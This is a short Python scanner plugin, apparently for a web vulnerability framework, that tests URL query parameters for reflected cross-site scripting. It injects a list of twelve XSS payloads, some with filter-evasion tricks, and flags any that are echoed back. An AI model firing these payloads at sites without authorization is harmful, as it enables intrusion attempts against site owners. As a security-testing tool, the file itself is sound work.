#!/usr/bin/env python
#-*- coding:utf-8 -*-
import urlparse
from urllib import quote as urlencode
import os

def assign(service, arg):
    if service == 'spider_file':
        return True, arg

def audit(url,html):
    parse = urlparse.urlparse(url)
    if not parse.query:
        return
    
    for path in parse.query.split('&'):
        if '=' not in path:
            continue
        k, v = path.split('=')
        XSS_PAYLOAD	= [
			'<script>alert(1);</script>',
			'<script>prompt(1);</script>',
			'<script>confirm(1);</script>',
			'<scr<script>ipt>alert(1)</scr<script>ipt>',
			'<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">',
			'<svg/onload=prompt(1);>',
			'<marquee/onstart=confirm(1)>/',
			'<body onload=prompt(1);>',
			'<select autofocus onfocus=alert(1)>',
			'<textarea autofocus onfocus=alert(1)>',
			'<keygen autofocus onfocus=alert(1)>',
			'<video><source onerror="javascript:alert(1)">'		
	    ]
        for payload in XSS_PAYLOAD:
            url_1 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,urlencode(payload)))
            code, head, html, redirect_url, log = hackhttp.http(url_1)
            if payload in html:
                security_warning(log["request"].replace(os.linesep,'</br>'),'XSS:' + url_1)